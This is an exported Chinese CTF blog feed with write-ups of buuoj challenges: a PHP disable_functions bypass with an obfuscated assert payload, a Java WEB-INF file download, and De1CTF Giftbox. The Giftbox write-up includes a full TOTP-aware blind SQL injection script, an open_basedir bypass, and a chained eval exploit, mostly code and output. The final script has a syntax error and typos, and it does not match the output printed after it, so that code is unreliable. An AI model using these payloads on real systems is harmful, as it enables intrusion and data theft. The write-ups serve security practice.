<p>最后payload:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?code&#x3D;$_&#x3D;(~%A0%B8%BA%AB);$$_&#123;%27__%27&#125;($$_&#123;%27_%27&#125;);&amp;__&#x3D;assert&amp;_&#x3D;include &quot;&#x2F;tmp&#x2F;bypass_disablefunc.php&quot;&amp;cmd&#x3D;&#x2F;readflag&amp;outpath&#x3D;&#x2F;tmp&#x2F;xx&amp;sopath&#x3D;&#x2F;tmp&#x2F;bypass_disablefunc_x64.so</span><br></pre></td></tr></table></figure>

<p>输出为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> example: http:&#x2F;&#x2F;site.com&#x2F;bypass_disablefunc.php?cmd&#x3D;pwd&amp;outpath&#x3D;&#x2F;tmp&#x2F;xx&amp;sopath&#x3D;&#x2F;var&#x2F;www&#x2F;bypass_disablefunc_x64.so</span><br><span class="line"></span><br><span class="line">cmdline: &#x2F;readflag &gt; &#x2F;tmp&#x2F;xx 2&gt;&amp;1</span><br><span class="line"></span><br><span class="line">output:</span><br><span class="line">flag&#123;6e16639a-9eca-45b8-a972-e61da4146393&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>刷题记录</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>web</tag>
        <tag>极客大挑战</tag>
      </tags>
  </entry>
  <entry>
    <title>buuoj刷题记录9</title>
    <url>/2020/01/24/buuoj%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%959/</url>
    <content><![CDATA[<h2 id="RoarCTF-2019-Easy-Java"><a href="#RoarCTF-2019-Easy-Java" class="headerlink" title="[RoarCTF 2019]Easy Java"></a>[RoarCTF 2019]Easy Java</h2><h3 id="0x00-基础"><a href="#0x00-基础" class="headerlink" title="0x00 基础"></a>0x00 基础</h3><p>WEB-INF是Java的WEB应用的安全目录。所谓安全就是客户端无法访问，只有服务端可以访问的目录。<br>如果想在页面中直接访问其中的文件，必须通过web.xml文件对要访问的文件进行相应映射才能访问。<br>/WEB-INF/web.xml : Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。</p>
<a id="more"></a>

<p>/WEB-INF/classes/ : 包含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中。<br>/WEB-INF/lib/ : 存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件。<br>页面放在WEB-INF目录下面,这样可以限制访问,提高安全性.如JSP,html</p>
<p>在get方式拿不到文件的时候试试post</p>
<h3 id="0x01-分析-amp-操作"><a href="#0x01-分析-amp-操作" class="headerlink" title="0x01 分析&amp;操作"></a>0x01 分析&amp;操作</h3><p>下载web.xml文件查看</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">web-app</span> <span class="attr">xmlns</span>=<span class="string">"http://xmlns.jcp.org/xml/ns/javaee"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">version</span>=<span class="string">"4.0"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">welcome-file-list</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">welcome-file</span>&gt;</span>Index<span class="tag">&lt;/<span class="name">welcome-file</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">welcome-file-list</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>IndexController<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>com.wm.ctf.IndexController<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>IndexController<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/Index<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>LoginController<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>com.wm.ctf.LoginController<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>LoginController<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/Login<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>DownloadController<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>com.wm.ctf.DownloadController<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>DownloadController<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/Download<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>FlagController<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>com.wm.ctf.FlagController<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>FlagController<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/Flag<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>其中有一个FlagController，尝试下载这个文件</p>
<p>下载后直接打开，发现有一串base64编码，解码后就是flag</p>
<p><img src="../pic/37.png" alt=""></p>
<p><code>flag{cb0751c7-6081-482d-8b03-f0edede8e178}</code></p>
]]></content>
      <categories>
        <category>刷题记录</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>roarctf</tag>
      </tags>
  </entry>
  <entry>
    <title>buuoj刷题记录8</title>
    <url>/2020/01/12/buuoj%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%958/</url>
    <content><![CDATA[<h2 id="De1CTF-2019-Giftbox"><a href="#De1CTF-2019-Giftbox" class="headerlink" title="[De1CTF 2019]Giftbox"></a>[De1CTF 2019]Giftbox</h2><h3 id="0x00-基础"><a href="#0x00-基础" class="headerlink" title="0x00 基础"></a>0x00 基础</h3><p>totp:TOTP算法(Time-based One-time Password algorithm)是一种从共享密钥和当前时间计算一次性密码的算法。 它已被采纳为Internet工程任务组标准RFC 6238，是Initiative for Open Authentication（OATH）的基石，并被用于许多双因素身份验证系统。TOTP是基于散列的消息认证码（HMAC）的示例。 它使用加密哈希函数将密钥与当前时间戳组合在一起以生成一次性密码。 由于网络延迟和不同步时钟可能导致密码接收者必须尝试一系列可能的时间来进行身份验证，因此时间戳通常以30秒的间隔增加，从而减少了潜在的搜索空间。</p>
<p>SQL盲注</p>
<p>open_basedir绕过</p>
<a id="more"></a>



<h3 id="0x01-分析"><a href="#0x01-分析" class="headerlink" title="0x01 分析"></a>0x01 分析</h3><p>打开网页发现是类似一个linux终端的界面，cd，ls，cat，clear，help，exix，输入help提示可运行下列命令，ls查看后，发现有一个usage.md</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">login [username] [password]</span><br><span class="line">logout</span><br><span class="line">launch</span><br><span class="line">targeting [code] [position]</span><br><span class="line">destruct</span><br></pre></td></tr></table></figure>

<p>fuzz后发现要登入，登入抓包的时候发现有一个totp参数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET &#x2F;shell.php?a&#x3D;login%20admin%20admin&amp;totp&#x3D;59858608 HTTP&#x2F;1.1</span><br><span class="line">Host: 9fc5cb4b-a3ef-4f38-944a-1390b4f71ebf.node3.buuoj.cn</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko&#x2F;20100101 Firefox&#x2F;72.0</span><br><span class="line">Accept: application&#x2F;json, text&#x2F;javascript, *&#x2F;*; q&#x3D;0.01</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http:&#x2F;&#x2F;9fc5cb4b-a3ef-4f38-944a-1390b4f71ebf.node3.buuoj.cn&#x2F;</span><br><span class="line">Cookie: PHPSESSID&#x3D;urs1ifeeiqsj6dam5rvs0l50nt</span><br></pre></td></tr></table></figure>

<p>进行login时发现username处存在单引号sql盲注，执行usage中其他操作需要登入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[de1ta@de1ta-mbp &#x2F;sandbox]% login admin&#39; admin</span><br><span class="line">login fail, user not found.</span><br><span class="line">[de1ta@de1ta-mbp &#x2F;sandbox]% login admin&#39;# admin</span><br><span class="line">login fail, password incorrect.</span><br><span class="line">[de1ta@de1ta-mbp &#x2F;sandbox]% targeting</span><br><span class="line">login first.</span><br><span class="line">[de1ta@de1ta-mbp &#x2F;sandbox]% launch</span><br><span class="line">login first.</span><br></pre></td></tr></table></figure>

<p>查看源码，再main.js发现了数据提交过程，和服务器totp设置</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">···</span><br><span class="line">&#x2F;*</span><br><span class="line">[Developer Notes]</span><br><span class="line">OTP Library for Python located in js&#x2F;pyotp.zip</span><br><span class="line">Server Params:</span><br><span class="line">digits &#x3D; 8</span><br><span class="line">interval &#x3D; 5</span><br><span class="line">window &#x3D; 1</span><br><span class="line">*&#x2F;</span><br><span class="line">···</span><br><span class="line">···</span><br><span class="line">$.ajax(&#123;</span><br><span class="line">        url: host + &#39;&#x2F;shell.php?a&#x3D;&#39;+encodeURIComponent(input)+&#39;&amp;totp&#x3D;&#39; + new TOTP(&quot;GAXG24JTMZXGKZBU&quot;,8).genOTP(),</span><br><span class="line">        type: &quot;GET&quot;,</span><br><span class="line">        dataType: &#39;json&#39;,</span><br><span class="line">        success: (res) &#x3D;&gt; &#123;</span><br><span class="line">            e_main.html($(&#39;#main&#39;).html() + &#39;[&lt;span id&#x3D;&quot;usr&quot;&gt;&#39; + usrName + &#39;&lt;&#x2F;span&gt;@&lt;span class&#x3D;&quot;host&quot;&gt;de1ta-mbp&lt;&#x2F;span&gt; &#39; + position + &#39;]% &#39; + input + &#39;&lt;br&#x2F;&gt;&#39; + res.message + &#39;&lt;br&#x2F;&gt;&#39;)</span><br><span class="line">            if (e_console.height()-$(window).height()&gt;0)&#123;e_console.css(&#39;top&#39;,-(e_console.height()-$(window).height()));&#125;else&#123;e_console.css(&#39;top&#39;,5);&#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        error: (res) &#x3D;&gt; &#123;</span><br><span class="line">            e_main.html($(&#39;#main&#39;).html() + &#39;[&lt;span id&#x3D;&quot;usr&quot;&gt;&#39; + usrName + &#39;&lt;&#x2F;span&gt;@&lt;span class&#x3D;&quot;host&quot;&gt;de1ta-mbp&lt;&#x2F;span&gt; &#39; + position + &#39;]% &#39; + input + &#39;&lt;br&#x2F;&gt;System Fatal Error!&lt;br&#x2F;&gt;&#39;)</span><br><span class="line">            if (e_console.height()-$(window).height()&gt;0)&#123;e_console.css(&#39;top&#39;,-(e_console.height()-$(window).height()));&#125;else&#123;e_console.css(&#39;top&#39;,5);&#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;)</span><br><span class="line">···</span><br></pre></td></tr></table></figure>

<h3 id="0x02-操作"><a href="#0x02-操作" class="headerlink" title="0x02 操作"></a>0x02 操作</h3><p>编写盲注脚本</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># @Time    : 1&#x2F;14&#x2F;2020 9:42 PM</span><br><span class="line">import pyotp</span><br><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">def get(url, payload):</span><br><span class="line">    time.sleep(0.5)</span><br><span class="line">    totp &#x3D; pyotp.TOTP(&#39;GAXG24JTMZXGKZBU&#39;, 8, interval&#x3D;5)</span><br><span class="line">    params &#x3D; &#123;</span><br><span class="line">        &#39;a&#39;: &quot;login admin&#39;&#x2F;**&#x2F;and&#x2F;**&#x2F;(&quot;+payload+&quot;)# admin&quot;,</span><br><span class="line">        &#39;totp&#39;: totp.now()</span><br><span class="line">    &#125;</span><br><span class="line">    # print(params)</span><br><span class="line">    html &#x3D; requests.get(url,params&#x3D;params,).text</span><br><span class="line">    # print(html)</span><br><span class="line">    return html</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def binsea(s_payload,len&#x3D;64):</span><br><span class="line">    result &#x3D; &#39;&#39;</span><br><span class="line">    for x in range(1, len+1):</span><br><span class="line">        left &#x3D; 0</span><br><span class="line">        right &#x3D; 126</span><br><span class="line">        while left &lt;&#x3D; right:</span><br><span class="line">            mid &#x3D; (left + right) &#x2F; 2</span><br><span class="line">            payload &#x3D; &quot;ascii(substr((%s),%d,1))&gt;%d&quot; % (s_payload,x, mid)</span><br><span class="line">            url &#x3D; &#39;http:&#x2F;&#x2F;257c0b3b-d0fb-4a75-811f-d763da9af540.node3.buuoj.cn&#x2F;shell.php&#39;</span><br><span class="line">            html &#x3D; get(url, payload)</span><br><span class="line">            # print(html, &#39;*-*-*-*-*-*&#39;, mid)</span><br><span class="line">            if &#39;password&#39; in html:</span><br><span class="line">                left &#x3D; mid +1</span><br><span class="line">            else:</span><br><span class="line">                right &#x3D; mid -1</span><br><span class="line">        mid &#x3D; int((left + right + 1) &#x2F; 2)</span><br><span class="line">        result +&#x3D; chr(mid)</span><br><span class="line">        print(result)</span><br><span class="line">    return result</span><br><span class="line"></span><br><span class="line">def get_database():</span><br><span class="line">    s_payload&#x3D;&#39;database()&#39;</span><br><span class="line">    database &#x3D; binsea(s_payload,7)</span><br><span class="line">    print(database)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def get_tabls():</span><br><span class="line">    s_payload &#x3D; &#39;select&#x2F;**&#x2F;group_concat(table_name)&#x2F;**&#x2F;from&#x2F;**&#x2F;information_schema.tables&#x2F;**&#x2F;where&#x2F;**&#x2F;table_schema&#x3D;\&#39;giftbox\&#39;&#39;</span><br><span class="line">    tables&#x3D;binsea(s_payload,5)</span><br><span class="line"></span><br><span class="line">def get_columns():</span><br><span class="line">    s_payload &#x3D; &#39;select&#x2F;**&#x2F;group_concat(column_name)&#x2F;**&#x2F;from&#x2F;**&#x2F;information_schema.columns&#x2F;**&#x2F;where&#x2F;**&#x2F;table_name&#x3D;\&#39;users\&#39;&#39;</span><br><span class="line">    columns&#x3D;binsea(s_payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def get_data():</span><br><span class="line">    s_payload&#x3D;&#39;select&#x2F;**&#x2F;concat(password)&#x2F;**&#x2F;from&#x2F;**&#x2F;users&#39;</span><br><span class="line">    password&#x3D;binsea(s_payload)</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    # get_database()</span><br><span class="line">    # get_tabls()</span><br><span class="line">    # get_columns()</span><br><span class="line">    # get_data()</span><br></pre></td></tr></table></figure>

<p>数据库是giftbox,只有一个users表，有<code>id,username,password</code></p>
<p>admin的密码是<code>hint{G1ve_u_hi33en_C0mm3nd-sh0w_hiiintttt_23333}</code></p>
<p>根据密码的提示得到</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[de1ta@de1ta-mbp &#x2F;sandbox]% sh0w_hiiintttt_23333</span><br><span class="line">we add an evil monster named &#39;eval&#39; when launching missiles.</span><br></pre></td></tr></table></figure>

<p>targeting  还有长度限制，code为2，possition为12。</p>
<p>在phpiofo中设置了open_basedir</p>
<p><img src="../pic/37.png" alt=""></p>
<p>关于open_basedir<br>   open_basedir是php.ini中的一个配置选项<br>   它可将用户访问文件的活动范围限制在指定的区域，<br>   假设open_basedir=/home/wwwroot/home/web1/:/tmp/，那么通过web1访问服务器的用户就无法获取服务器上除了/home/wwwroot/home/web1/和/tmp/这两个目录以外的文件。<br>   注意用open_basedir指定的限制实际上是前缀,而不是目录名。<br>   举例来说: 若”open_basedir = /dir/user”, 那么目录 “/dir/user” 和 “/dir/user1”都是可以访问的。所以如果要将访问限制在仅为指定的目录，请用斜线结束路径名。</p>
<p><a href="https://www.cnblogs.com/cimuhuashuimu/p/11544487.html" target="_blank" rel="noopener">绕过参考文章</a></p>
<p>绕过payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">chdir(&#39;img&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;&#x2F;&#39;);echo(file_get_contents(&#39;flag&#39;));&#96;</span><br></pre></td></tr></table></figure>

<p>附上完整脚本</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># @Time    : 1&#x2F;14&#x2F;2020 9:42 PM</span><br><span class="line">import pyotp</span><br><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">sesssion&#x3D;requests.session()</span><br><span class="line">url &#x3D; &#39;http:&#x2F;&#x2F;257c0b3b-d0fb-4a75-811f-d763da9af540.node3.buuoj.cn&#x2F;shell.php&#39;</span><br><span class="line">totp &#x3D; pyotp.TOTP(&#39;GAXG24JTMZXGKZBU&#39;, 8, interval&#x3D;5)</span><br><span class="line"></span><br><span class="line">def get(url, payload):</span><br><span class="line">    time.sleep(0.5)</span><br><span class="line">    params &#x3D; &#123;</span><br><span class="line">        &#39;a&#39;: &quot;login admin&#39;&#x2F;**&#x2F;and&#x2F;**&#x2F;(&quot;+payload+&quot;)# admin&quot;,</span><br><span class="line">        &#39;totp&#39;: totp.now()</span><br><span class="line">    &#125;</span><br><span class="line">    # print(params)</span><br><span class="line">    html &#x3D; requests.get(url,params&#x3D;params,).text</span><br><span class="line">    # print(html)</span><br><span class="line">    return html</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def binsea(s_payload,len&#x3D;64):</span><br><span class="line">    result &#x3D; &#39;&#39;</span><br><span class="line">    for x in range(1, len+1):</span><br><span class="line">        left &#x3D; 0</span><br><span class="line">        right &#x3D; 126</span><br><span class="line">        while left &lt;&#x3D; right:</span><br><span class="line">            mid &#x3D; (left + right) &#x2F; 2</span><br><span class="line">            payload &#x3D; &quot;ascii(substr((%s),%d,1))&gt;%d&quot; % (s_payload,x, mid)</span><br><span class="line"></span><br><span class="line">            html &#x3D; get(url, payload)</span><br><span class="line">            # print(html, &#39;*-*-*-*-*-*&#39;, mid)</span><br><span class="line">            if &#39;password&#39; in html:</span><br><span class="line">                left &#x3D; mid +1</span><br><span class="line">            else:</span><br><span class="line">                right &#x3D; mid -1</span><br><span class="line">        mid &#x3D; int((left + right + 1) &#x2F; 2)</span><br><span class="line">        result +&#x3D; chr(mid)</span><br><span class="line">        print(result)</span><br><span class="line">    return result</span><br><span class="line"></span><br><span class="line">def get_database():</span><br><span class="line">    s_payload&#x3D;&#39;database()&#39;</span><br><span class="line">    database &#x3D; binsea(s_payload,7)</span><br><span class="line">    print(database)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def get_tabls():</span><br><span class="line">    s_payload &#x3D; &#39;select&#x2F;**&#x2F;group_concat(table_name)&#x2F;**&#x2F;from&#x2F;**&#x2F;information_schema.tables&#x2F;**&#x2F;where&#x2F;**&#x2F;table_schema&#x3D;\&#39;giftbox\&#39;&#39;</span><br><span class="line">    tables&#x3D;binsea(s_payload,5)</span><br><span class="line"></span><br><span class="line">def get_columns():</span><br><span class="line">    s_payload &#x3D; &#39;select&#x2F;**&#x2F;group_concat(column_name)&#x2F;**&#x2F;from&#x2F;**&#x2F;information_schema.columns&#x2F;**&#x2F;where&#x2F;**&#x2F;table_name&#x3D;\&#39;users\&#39;&#39;</span><br><span class="line">    columns&#x3D;binsea(s_payload,23)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def get_data():</span><br><span class="line">    s_payload&#x3D;&#39;select&#x2F;**&#x2F;concat(password)&#x2F;**&#x2F;from&#x2F;**&#x2F;users&#39;</span><br><span class="line">    password&#x3D;binsea(s_payload,13)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def login():</span><br><span class="line">    params &#x3D; &#123;</span><br><span class="line">        &#39;a&#39;: &quot;login admin hint&#123;G1ve_u_hi33en_C0mm3nd-sh0w_hiiintttt_23333&#125;&quot;,</span><br><span class="line">        &#39;totp&#39;: totp.now()</span><br><span class="line">    &#125;</span><br><span class="line">    sesssion.get(url, params&#x3D;params)</span><br><span class="line"></span><br><span class="line">def target(code,position):</span><br><span class="line"></span><br><span class="line">    params &#x3D; &#123;</span><br><span class="line">        &#39;a&#39;: &quot;targeting&quot;+code+&#39; &#39;+position,</span><br><span class="line">        &#39;totp&#39;: totp.now()</span><br><span class="line">    &#125;</span><br><span class="line">    sesssion.get(url,params&#x3D;params)</span><br><span class="line"></span><br><span class="line">def destruct():</span><br><span class="line">    params &#x3D; &#123;</span><br><span class="line">        &#39;a&#39;: &quot;destruct&quot;,</span><br><span class="line">        &#39;totp&#39;: totp.now()</span><br><span class="line">    &#125;</span><br><span class="line">    sesssion.get(url, params&#x3D;params)</span><br><span class="line"></span><br><span class="line">def launch():</span><br><span class="line">    params &#x3D; &#123;</span><br><span class="line">        &#39;a&#39;: &#39;launch&#39;,</span><br><span class="line">        &#39;totp&#39;: totp.now()</span><br><span class="line">    &#125;</span><br><span class="line">    print(sesssion.get(url, params&#x3D;params).json())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def get_password():</span><br><span class="line">    # get_database()</span><br><span class="line">    # get_tabls()</span><br><span class="line">    # get_columns()</span><br><span class="line">    get_data()</span><br><span class="line">    </span><br><span class="line">def get_flag():</span><br><span class="line">    login()</span><br><span class="line">    target(&#39;a&#39;,&#39;chdir&#39;)</span><br><span class="line">    target(&#39;b&#39;,&#39;img&#39;)</span><br><span class="line">    target(&#39;c&#39;,&#39;&#123;$a($b)&#125;&#39;)</span><br><span class="line"></span><br><span class="line">    target(&#39;d&#39;,&#39;ini_set&#39;)</span><br><span class="line">    target(&#39;e&#39;, &#39;open_base_dir&#39;)</span><br><span class="line">    target(&#39;f&#39;, &#39;..&#39;)</span><br><span class="line">    target(&#39;g&#39;, &#39;&#123;$d($e,$f)&#125;&#39;)</span><br><span class="line"></span><br><span class="line">    target(&#39;h&#39;, &#39;&#123;$a($f)&#125;&#39;)</span><br><span class="line"></span><br><span class="line">    target(&#39;i&#39;, &#39;&#123;$a($f)&#125;&#39;)</span><br><span class="line"></span><br><span class="line">    target(&#39;j&#39;, &#39;&#123;$a($f)&#125;&#39;)</span><br><span class="line"></span><br><span class="line">    target(&#39;k&#39;,&#39;&#123;$a($f)&#125;&#39; )</span><br><span class="line"></span><br><span class="line">    target(&#39;l&#39;, &#39;&#x2F;&#39;)</span><br><span class="line">    target(&#39;m&#39;, &#39;&#123;$d($e,$l)&#125;&#39;)</span><br><span class="line"></span><br><span class="line">    target(&#39;n&#39;, &#39;eaho&#39;)</span><br><span class="line">    target(&#39;o&#39;, &#39;file_get_&#39;)</span><br><span class="line">    target(&#39;p&#39;, &#39;contents&#39;)</span><br><span class="line">    target(&#39;q&#39;, &#39;$o$p&#39;)</span><br><span class="line">    target(&#39;r&#39;, &#39;flag&#39;)</span><br><span class="line">    target(&#39;s&#39;,&#39;&#123;$n($q(r))&#125;&#39; )</span><br><span class="line">    launch()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">	get_flag():</span><br></pre></td></tr></table></figure>

<p>返回结果</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#39;code&#39;: 0, &#39;message&#39;: &#39;Initializing launching system...&lt;br&gt;Setting target: $a &#x3D; &quot;chdir&quot;;&lt;br&gt;Reading target: $a &#x3D; &quot;chdir&quot;;&lt;br&gt;Setting target: $b &#x3D; &quot;img&quot;;&lt;br&gt;Reading target: $b &#x3D; &quot;img&quot;;&lt;br&gt;Setting target: $c &#x3D; &quot;&#123;$a($b)&#125;&quot;;&lt;br&gt;Reading target: $c &#x3D; &quot;1&quot;;&lt;br&gt;Setting target: $d &#x3D; &quot;ini_set&quot;;&lt;br&gt;Reading target: $d &#x3D; &quot;ini_set&quot;;&lt;br&gt;Setting target: $e &#x3D; &quot;open_basedir&quot;;&lt;br&gt;Reading target: $e &#x3D; &quot;open_basedir&quot;;&lt;br&gt;Setting target: $f &#x3D; &quot;..&quot;;&lt;br&gt;Reading target: $f &#x3D; &quot;..&quot;;&lt;br&gt;Setting target: $g &#x3D; &quot;&#123;$d($e,$f)&#125;&quot;;&lt;br&gt;Reading target: $g &#x3D; &quot;&#x2F;app:&#x2F;sandbox&quot;;&lt;br&gt;Setting target: $h &#x3D; &quot;&#123;$a($f)&#125;&quot;;&lt;br&gt;Reading target: $h &#x3D; &quot;1&quot;;&lt;br&gt;Setting target: $i &#x3D; &quot;&#123;$a($f)&#125;&quot;;&lt;br&gt;Reading target: $i &#x3D; &quot;1&quot;;&lt;br&gt;Setting target: $j &#x3D; &quot;Ly8v&quot;;&lt;br&gt;Reading target: $j &#x3D; &quot;Ly8v&quot;;&lt;br&gt;Setting target: $k &#x3D; &quot;base64_&quot;;&lt;br&gt;Reading target: $k &#x3D; &quot;base64_&quot;;&lt;br&gt;Setting target: $l &#x3D; &quot;decode&quot;;&lt;br&gt;Reading target: $l &#x3D; &quot;decode&quot;;&lt;br&gt;Setting target: $m &#x3D; &quot;$k$l&quot;;&lt;br&gt;Reading target: $m &#x3D; &quot;base64_decode&quot;;&lt;br&gt;Setting target: $n &#x3D; &quot;&#123;$m($j)&#125;&quot;;&lt;br&gt;Reading target: $n &#x3D; &quot;&#x2F;&#x2F;&#x2F;&quot;;&lt;br&gt;Setting target: $o &#x3D; &quot;&#123;$d($e,$n)&#125;&quot;;&lt;br&gt;Reading target: $o &#x3D; &quot;..&quot;;&lt;br&gt;Setting target: $p &#x3D; &quot;flag&quot;;&lt;br&gt;Reading target: $p &#x3D; &quot;flag&quot;;&lt;br&gt;Setting target: $q &#x3D; &quot;file_get&quot;;&lt;br&gt;Reading target: $q &#x3D; &quot;file_get&quot;;&lt;br&gt;Setting target: $r &#x3D; &quot;_contents&quot;;&lt;br&gt;Reading target: $r &#x3D; &quot;_contents&quot;;&lt;br&gt;Setting target: $s &#x3D; &quot;$q$r&quot;;&lt;br&gt;Reading target: $s &#x3D; &quot;file_get_contents&quot;;&lt;br&gt;Setting target: $t &#x3D; &quot;&#123;$s($p)&#125;&quot;;&lt;br&gt;Reading target: $t &#x3D; &quot;flag&#123;dd8dcd47-5bce-4fe2-b2ee-f2aec667ddd3&#125;\n&quot;;&lt;br&gt;3..2..1..Fire!&lt;br&gt;All 20 missiles are 